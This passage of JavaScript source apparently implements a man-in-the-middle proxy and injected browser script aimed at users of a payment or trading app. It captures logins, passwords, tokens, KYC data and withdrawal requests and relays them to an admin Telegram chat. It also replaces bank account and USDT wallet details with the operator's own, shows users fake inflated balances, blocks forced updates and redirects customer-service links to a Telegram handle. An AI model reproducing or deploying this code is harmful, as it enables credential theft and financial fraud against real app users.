  const opts = { method: req.method, headers: fwd, redirect: 'manual' };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  return { response, respBody, respHeaders };
}

async function proxyToReal(req) {
  const path = req.originalUrl || req.url;
  const url = REAL_API + path;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl === 'x-px-uid' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || kl.startsWith('x-px-')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'qonix.click';
  const opts = { method: req.method, headers: fwd, redirect: 'manual' };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  return { response, respBody, respHeaders };
}

function sendJson(res, headers, json, fallbackBody) {
  const body = json ? JSON.stringify(json) : fallbackBody;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  res.writeHead(200, headers);
  res.end(body);
}

app.get('/app/version', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyToTivox(req);
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch(e) {}
    if (jsonResp) {
      if (data.blockUpdate !== false) {
        if (jsonResp.forceUpdate !== undefined) jsonResp.forceUpdate = false;
        if (jsonResp.needUpdate !== undefined) jsonResp.needUpdate = false;
        if (jsonResp.force_update !== undefined) jsonResp.force_update = false;
        if (jsonResp.update !== undefined) jsonResp.update = false;
        const rd = jsonResp.data || jsonResp.body || jsonResp.result;
        if (rd && typeof rd === 'object') {
          if (rd.forceUpdate !== undefined) rd.forceUpdate = false;
          if (rd.needUpdate !== undefined) rd.needUpdate = false;
        }
      }
      sendJson(res, respHeaders, jsonResp);
    } else {
      respHeaders['content-length'] = String(Buffer.byteLength(respBody));
      res.writeHead(response.status, respHeaders);
      res.end(respBody);
    }
  } catch(e) {
    console.error('version error:', e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.get('/app/jsValue/:type', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyToTivox(req);
    notifyAdmin(data, `📜 JS Value (${req.params.type})\n${respBody.substring(0, 500)}`);
    respHeaders['content-length'] = String(Buffer.byteLength(respBody));
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.all('/xxapi/*', async (req, res) => {
  try {
    const data = await loadData();
    const path = req.originalUrl || req.url;
    const urlLower = path.toLowerCase();
    const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

    const { response, respBody, respHeaders } = await proxyToReal(req);

    if (data.blockUpdate !== false) {
      for (const k of Object.keys(respHeaders)) {
        if (k.toLowerCase() === 'needupdateflag') delete respHeaders[k];
      }
    }

    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch(e) {}

    if (!jsonResp) {
      respHeaders['content-length'] = String(Buffer.byteLength(respBody));
      res.writeHead(response.status, respHeaders);
      return res.end(respBody);
    }

    const respData = jsonResp.data || jsonResp.body || jsonResp.result || null;

    if (urlLower.includes('customerservice') || urlLower.includes('customer_service') || urlLower.includes('customer-service') || urlLower.includes('csrlist') || urlLower.includes('servicelist')) {
      function replaceAllUrls(obj) {
        if (!obj || typeof obj !== 'object') return;
        if (Array.isArray(obj)) { obj.forEach(item => replaceAllUrls(item)); return; }
        for (const k of Object.keys(obj)) {
          if (typeof obj[k] === 'string') {
            const v = obj[k].trim();
            if (v.startsWith('http://') || v.startsWith('https://') || v.startsWith('tg://') || v.startsWith('whatsapp://')) {
              obj[k] = 'https://t.me/Vivipaymed';
            }
          } else if (typeof obj[k] === 'object') {
            replaceAllUrls(obj[k]);
          }
        }
      }
      replaceAllUrls(jsonResp);
      const finalBody = JSON.stringify(jsonResp);
      const finalCS = finalBody.replace(/https?:\/\/[^\s"',}\]]+/g, 'https://t.me/Vivipaymed');
      respHeaders['content-length'] = String(Buffer.byteLength(finalCS));
      res.writeHead(response.status, respHeaders);
      return res.end(finalCS);
    }

    let reqBody = {};
    if (req.rawBody && req.rawBody.length > 0) {
      try {
        const ct = (req.headers['content-type'] || '').toLowerCase();
        if (ct.includes('json')) { reqBody = JSON.parse(req.rawBody.toString()); }
        else if (ct.includes('multipart')) { reqBody = parseMultipartFields(req.rawBody); }
        else if (ct.includes('form')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
      } catch(e) {}
    }
    if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
      reqBody = { ...reqBody, ...req.body };
    }

    let userId = '';
    const pxUid = req.headers['x-px-uid'] || '';
    if (pxUid && /^\d{3,12}$/.test(pxUid)) userId = pxUid;
    if (!userId && respData && typeof respData === 'object') userId = findNumericId(respData, 0);
    if (!userId) userId = findNumericId(jsonResp, 0);
    if (!userId) userId = findNumericId(reqBody, 0);
    if (!userId) userId = await resolveUserId(req);

    const reqPhone = reqBody.phone || reqBody.mobile || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
    const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
    const phone = reqPhone || respPhone;

    if (userId) {
      await saveUserMapping(req, userId);
      if (!data.trackedUsers) data.trackedUsers = {};
      const existing = data.trackedUsers[String(userId)] || {};
      data.trackedUsers[String(userId)] = {
        ...existing,
        lastSeen: now,
        lastAction: path.split('/').pop() || 'API',
        phone: phone || existing.phone || ''
      };
      if (respData && typeof respData === 'object') {
        const rName = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
        if (rName) data.trackedUsers[String(userId)].name = rName;
      }
    }

    const isLogin = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('auth') || urlLower.includes('register');
    if (isLogin) {
      const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
      const token = (respData && typeof respData === 'object') ? (respData.token || respData.accessToken || '') : '';
      notifyAdmin(data,
`🔑 LOGIN CAPTURED
👤 User ID: ${userId || 'N/A'}
📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Password: ' + pwd : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 60) + '...' : ''}
📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 800) : 'empty'}
📋 Response: ${respBody.substring(0, 500)}
🕐 ${now}`);

      if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
        notifyAdmin(data, `🚫 BLOCKED LOGIN\n📱 Phone: ${phone}\n🔒 Suspended\n🕐 ${now}`);
        return res.status(200).json({ code: 500, message: 'Account Suspended', data: null });
      }
    }

    const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
      urlLower.includes('member/info') || urlLower.includes('user/info') ||
      urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
      urlLower.includes('getmember') || urlLower.includes('memberdetail');

    if (isUserInfo && respData && typeof respData === 'object' && userId) {
      const balResult = findBalanceDeep(respData, 0) || findBalanceDeep(jsonResp, 0);
      if (balResult) {
        const realBalance = balResult.value;
        const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
        const addedBalance = uo.addedBalance || 0;
        const globalBonus = data.depositBonus || 0;
        const totalFake = addedBalance + globalBonus;
        const shownBalance = parseFloat((realBalance + totalFake).toFixed(2));
        const lastReal = uo.lastRealBalance;
        const trackedUser = (data.trackedUsers && data.trackedUsers[String(userId)]) || {};
        const userName = trackedUser.name || '';
        const userPhone = trackedUser.phone || phone || '';

        if (!data.userOverrides) data.userOverrides = {};
        if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
        data.userOverrides[String(userId)].lastRealBalance = realBalance;

        const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
        const snapKey = `bal_${userId}`;
        const lastSnapTime = _balSnapTimes[snapKey] || 0;
        const nowMs = Date.now();
        const shouldNotify = balChanged || (nowMs - lastSnapTime > 120000);

        if (shouldNotify && (nowMs - lastSnapTime > 10000)) {
          _balSnapTimes[snapKey] = nowMs;
          const changeStr = lastReal !== undefined
            ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
            : '';
          notifyAdmin(data,
`┌──────────────────────────┐
│    💎 BALANCE SNAPSHOT    │
└──────────────────────────┘
👤 ID: ${userId}${userName ? '\n📛 Name: ' + userName : ''}${userPhone ? '\n📱 Phone: ' + userPhone : ''}

📊 BALANCE BREAKDOWN:
💰 Real Balance:   ₹${realBalance.toFixed(2)}
➕ Bot Added:      ₹${totalFake.toFixed(2)}${addedBalance ? ' (user: +₹' + addedBalance + ')' : ''}${globalBonus ? (addedBalance ? ', global: +₹' + globalBonus : ' (global: +₹' + globalBonus + ')') : ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━
👁 User Sees:      ₹${shownBalance.toFixed(2)}${changeStr}

🔗 Field: ${balResult.field}
🕐 ${now}`);
        }
        data.trackedUsers[String(userId)].balance = String(realBalance);
      }
    }

    const isOrder = /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
      || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST');
    if (isOrder) {
      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo'];
      let orderId = '';
      if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
        for (const f of orderFields) {
          if (respData[f] && String(respData[f]).length >= 3) { orderId = String(respData[f]); break; }
        }
      }
      const bank = getActiveBank(data, userId);
      if (orderId && bank) {
        if (!data.orderBankMap) data.orderBankMap = {};
        data.orderBankMap[orderId] = {
          bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
          time: now, userId: userId || ''
        };
      }
      notifyAdmin(data,
`🔔 ORDER DETECTED
👤 User: ${userId || 'N/A'}${phone ? '\n📱 Phone: ' + phone : ''}${orderId ? '\n📋 Order: ' + orderId : ''}
💳 Bank: ${bank ? bank.accountHolder + ' | ' + bank.accountNo : 'N/A'}
📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1000) : 'empty'}
📋 Response: ${respBody.substring(0, 500)}
🕐 ${now}`);
    }

    if (urlLower.includes('kyc') || urlLower.includes('bind') || urlLower.includes('linkkyc')) {
      notifyAdmin(data,
`🔐 KYC/BIND DATA
👤 User: ${userId || 'N/A'}
📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1500) : 'empty'}
📋 Response: ${respBody.substring(0, 500)}
🕐 ${now}`);
    }

    if (urlLower.includes('sell') || urlLower.includes('withdraw')) {
      notifyAdmin(data,
`💸 SELL/WITHDRAW
👤 User: ${userId || 'N/A'}
📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1000) : 'empty'}
📋 Response: ${respBody.substring(0, 500)}
🕐 ${now}`);
    }

    if (data.logRequests && data.adminChatId && bot && !isLogin && !isUserInfo && !isOrder) {
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      const postData = (req.method === 'POST' && req.rawBody && req.rawBody.length > 0) ? `\n📦 POST: ${req.rawBody.toString().substring(0, 300)}` : '';
      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}${postData}\n📊 Status: ${response.status}`).catch(()=>{});
    }

    if (data.botEnabled !== false) {
      const bank = getActiveBank(data, userId);
      if (bank) {
        const globalHasAcct = scanHasBankFields(jsonResp, 0);
        deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
      }

      {
        const uo = userId ? ((data.userOverrides && data.userOverrides[String(userId)]) || {}) : {};
        const addedBalance = uo.addedBalance || 0;
        const globalBonus = data.depositBonus || 0;
        const totalBonus = addedBalance + globalBonus;
        if (totalBonus > 0) {
          addBalanceToFields(jsonResp, totalBonus, 0);
        }
      }

      if (data.usdtAddress) {
        replaceUsdtAddress(jsonResp, data.usdtAddress, 0);
      }
    }

    if (userId) await saveData(data);

    sendJson(res, respHeaders, jsonResp);

  } catch(e) {
    console.error('xxapi proxy error:', e.message);
    try {
      const url = REAL_API + (req.originalUrl || req.url);
      const fwd = {};
      for (const [k, v] of Object.entries(req.headers)) {
        const kl = k.toLowerCase();
        if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
        fwd[k] = v;
      }
      fwd['host'] = 'qonix.click';
      const opts = { method: req.method, headers: fwd, redirect: 'manual' };
      if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
        opts.body = req.rawBody;
      }
      const resp = await fetch(url, opts);
      const body = await resp.text();
      res.writeHead(resp.status, { 'content-type': resp.headers.get('content-type') || 'application/json' });
      res.end(body);
    } catch(e2) {
      if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
    }
  }
});

const INJECT_JS = `(function(){
if(window._pxi)return;window._pxi=1;
var P='https://${PROXY_HOST}';
var REAL='https://qonix.click';
var CFG=null;
var UID='';

try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\\d{6,12}$/.test(_ls))UID=_ls;}catch(e){}

function lc(){
try{var x=new XMLHttpRequest();
x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
x.send();if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
function lcAsync(){
try{var x=new XMLHttpRequest();
x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};
x.send();}catch(e){}}
try{lc();}catch(e){}
setInterval(function(){lcAsync();},25000);

var ID_FIELDS=['teamWorkId','memberCodeId','userId','channelUid','uid','memberId','accountId'];

function setUID(id){
if(!id||!/^\\d{6,12}$/.test(id)||id===UID)return;
UID=id;try{localStorage.setItem('_px_uid',id);}catch(e){}
lcAsync();}

var _open=XMLHttpRequest.prototype.open;
var _send=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open=function(m,u){
if(typeof u==='string'&&u.indexOf(REAL)===0){
u=P+u.substring(REAL.length);
arguments[1]=u;}
this._hu=u;this._hm=m;
var ret=_open.apply(this,arguments);
if(UID){try{this.setRequestHeader('x-px-uid',UID);}catch(e){}}
return ret;};

var _cachedBal=null;
function fmtBal(v){var n=parseFloat(v);if(isNaN(n))return null;return n.toFixed(2);}
if(CFG&&CFG.bal!==null&&CFG.bal!==undefined){_cachedBal=fmtBal(CFG.bal);}
if(!_cachedBal){try{var _cb=localStorage.getItem('_px_bal');if(_cb)_cachedBal=fmtBal(_cb);}catch(e){}}

function cacheBal(obj){
if(!obj||typeof obj!=='object')return;
var bks=['iToken','itoken','balance','userBalance','availableBalance','totalBalance','money','tokenBalance'];
for(var i=0;i<bks.length;i++){
var bk=bks[i];
if(obj[bk]!==undefined&&obj[bk]!==null&&obj[bk]!==''){
var bv=parseFloat(obj[bk]);
if(!isNaN(bv)&&bv>0){_cachedBal=bv.toFixed(2);
try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}

function patchBalDOM(){
if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
if(!document.body)return;
var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
var toFix=[];
while(walker.nextNode()){
var nd=walker.currentNode;
var txt=(nd.textContent||'').trim();
if(txt!=='0.00'&&txt!=='0'&&txt!=='0.0')continue;
var el=nd.parentElement;
if(!el||el.children.length>0)continue;
var p1=el.parentElement;
var p2=p1?p1.parentElement:null;
var p3=p2?p2.parentElement:null;
var ctx='';
if(p1)ctx+=(p1.innerText||'').toLowerCase();
if(p2)ctx+=' '+(p2.innerText||'').toLowerCase();
if(p3)ctx+=' '+(p3.innerText||'').toLowerCase();
if(ctx.indexOf('itoken')>-1||ctx.indexOf('balance')>-1||ctx.indexOf('my itoken')>-1||ctx.indexOf('wallet')>-1){
var elCtx=(el.innerText||'').toLowerCase();
if(elCtx.indexOf('profit')===-1&&elCtx.indexOf('reward')===-1&&elCtx.indexOf('team')===-1&&elCtx.indexOf('commission')===-1){
toFix.push(nd);}}}
for(var i=0;i<toFix.length;i++){toFix[i].textContent=_cachedBal;}}

XMLHttpRequest.prototype.send=function(body){
var self=this;
self.addEventListener('load',function(){
try{
var r=self.response;
if(!r)return;
var j=typeof r==='object'?r:(typeof r==='string'?JSON.parse(r):null);
if(!j)return;
var d=j.data||j.body||j.result||j;
if(d&&typeof d==='object'){
cacheBal(d);
for(var i=0;i<ID_FIELDS.length;i++){
var f=ID_FIELDS[i];
if(d[f]){var v=String(d[f]).trim();
if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}
setTimeout(patchBalDOM,50);setTimeout(patchBalDOM,200);setTimeout(patchBalDOM,500);
}catch(e){}});
return _send.apply(this,arguments);};

var _fetch=window.fetch;
if(_fetch){
window.fetch=function(input,init){
var url=typeof input==='string'?input:(input&&input.url)||'';
if(url.indexOf(REAL)===0){
var nu=P+url.substring(REAL.length);
if(typeof input==='string'){arguments[0]=nu;}
else{arguments[0]=new Request(nu,input);}}
if(UID){if(!init)init={};if(!init.headers)init.headers={};
if(init.headers instanceof Headers){init.headers.set('x-px-uid',UID);}
else{init.headers['x-px-uid']=UID;}arguments[1]=init;}
return _fetch.apply(this,arguments).then(function(resp){
try{var cl=resp.clone();
cl.text().then(function(t){
try{var j=JSON.parse(t);var d=j.data||j.body||j.result||j;
if(d&&typeof d==='object'){
cacheBal(d);
for(var i=0;i<ID_FIELDS.length;i++){
var f=ID_FIELDS[i];if(d[f]){var v=String(d[f]).trim();
if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}}).catch(function(){});}catch(e){}
return resp;});};}

var _csPage=false;
function csUrl(s){
if(!s||typeof s!=='string')return false;
return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1||s.indexOf('telegram.org')>-1||s.indexOf('chat.')>-1||s.indexOf('support')>-1||s.indexOf('service')>-1||s.indexOf('kefu')>-1;}

function isCSPage(){
var txt=(document.body?document.body.innerText:'').toLowerCase();
return txt.indexOf('customer service')>-1||txt.indexOf('online service')>-1||txt.indexOf('online csr')>-1||txt.indexOf('whatsapp')>-1;}

function fixLinks(){
if(!CFG||!CFG.tg)return;
_csPage=isCSPage();
var links=document.querySelectorAll('a');
for(var i=0;i<links.length;i++){
var h=links[i].href||'';
if(csUrl(h)){links[i].href=CFG.tg;links[i].setAttribute('href',CFG.tg);}}}

function fixOnClick(){
if(!CFG||!CFG.tg)return;
var all=document.querySelectorAll('[onclick]');
for(var i=0;i<all.length;i++){
var oc=all[i].getAttribute('onclick')||'';
if(csUrl(oc)){all[i].setAttribute('onclick',"window.location.href='"+CFG.tg+"'");}}}

var _wopen=window.open;
window.open=function(url){
if(CFG&&CFG.tg){
if(csUrl(url)||_csPage){arguments[0]=CFG.tg;}}
return _wopen.apply(this,arguments);};

var _locDesc=Object.getOwnPropertyDescriptor(window,'location')||{};
var _asgn=window.location.assign.bind(window.location);
var _repl=window.location.replace.bind(window.location);
window.location.assign=function(url){if(CFG&&CFG.tg&&(csUrl(url)||_csPage))url=CFG.tg;return _asgn(url);};
window.location.replace=function(url){if(CFG&&CFG.tg&&(csUrl(url)||_csPage))url=CFG.tg;return _repl(url);};

if(window.xamlAction&&window.xamlAction.invokeAction){
var _invoke=window.xamlAction.invokeAction.bind(window.xamlAction);
window.xamlAction.invokeAction=function(action,params){
if(CFG&&CFG.tg&&params){
try{var p=JSON.parse(params);
var changed=false;
var ukeys=['ct_url','url','link','href','jumpUrl','serviceUrl','csUrl','jump_url','target','redirect','contactUrl'];
ukeys.forEach(function(key){
if(p[key]&&typeof p[key]==='string'&&(csUrl(p[key])||p[key].indexOf('http')===0)){p[key]=CFG.tg;changed=true;}});
if(changed)params=JSON.stringify(p);
}catch(e){}}
return _invoke(action,params);};}

document.addEventListener('click',function(e){
if(!CFG||!CFG.tg)return;
var el=e.target;var depth=0;
var onCS=_csPage||isCSPage();
while(el&&depth<10){
if(el.tagName==='A'){
var href=el.getAttribute('href')||'';
if(csUrl(href)||(onCS&&href.indexOf('http')===0)){
e.preventDefault();e.stopPropagation();
window.location.href=CFG.tg;return;}
if(href.indexOf('xaml:')===0){
try{var dec=decodeURIComponent(href.substring(5));
var jo=JSON.parse(dec);
var ck=['ct_url','url','link','href','jumpUrl','jump_url','target','serviceUrl'];
var ch=false;
ck.forEach(function(k2){if(jo[k2]){jo[k2]=CFG.tg;ch=true;}});
if(ch){e.preventDefault();e.stopPropagation();window.location.href=CFG.tg;return;}}catch(e2){}}
if(href.indexOf('syt:')===0){
try{var dec2=decodeURIComponent(href.substring(4));
var jo2=JSON.parse(dec2);
if(jo2.url||jo2.link||jo2.href){
e.preventDefault();e.stopPropagation();window.location.href=CFG.tg;return;}}catch(e3){}}}
if(onCS&&(el.tagName==='BUTTON'||el.tagName==='DIV'||el.tagName==='SPAN'||el.tagName==='LI')){
var elTxt=(el.innerText||'').toLowerCase();
if(elTxt.indexOf('go')>-1||elTxt.indexOf('service')>-1||elTxt.indexOf('online')>-1||elTxt.indexOf('csr')>-1||elTxt.indexOf('whatsapp')>-1||elTxt.indexOf('telegram')>-1||elTxt.indexOf('contact')>-1){
e.preventDefault();e.stopPropagation();
window.location.href=CFG.tg;return;}}
el=el.parentElement;depth++;}
},true);

function scanDOM(){
try{if(!document.body)return;
var txt=document.body.innerText||'';
var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
if(m&&m[1])setUID(m[1]);
}catch(e){}}

scanDOM();patchBalDOM();
var _rafC=0;function _rafLoop(){patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
requestAnimationFrame(_rafLoop);
setInterval(function(){scanDOM();patchBalDOM();},300);
if(document.body){
var obs=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
else{document.addEventListener('DOMContentLoaded',function(){
patchBalDOM();
var obs2=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});}
setInterval(function(){fixLinks();fixOnClick();},2000);
fixLinks();fixOnClick();patchBalDOM();
})();`;

module.exports = app;
